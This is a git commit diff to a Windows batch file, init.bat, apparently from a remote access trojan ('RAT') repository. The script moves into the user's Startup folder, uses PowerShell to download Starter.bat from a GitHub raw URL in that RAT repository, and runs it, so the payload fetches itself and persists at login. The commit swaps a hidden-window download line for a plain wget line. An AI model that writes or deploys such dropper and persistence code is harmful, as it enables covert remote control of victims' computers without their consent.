fee195c7214b3c205b02fd57e75a9d78b30d1ada
saif <saif.aboueldahab@gmail.com>
2023-05-25 20:26:30 +0300

    sa

--- init.bat
+++ init.bat
@@ -3,7 +3,7 @@ set "currentd=%cd%"
 set "username=saifa"
 set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %targetd%
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
+powershell powershell.exe "wget https://raw.githubusercontent.com/saifnasef/RAT/main/Starter.bat -o Starter.bat"
 powershell ./Starter.bat
 cd %currentd%
 @rem del init.bat
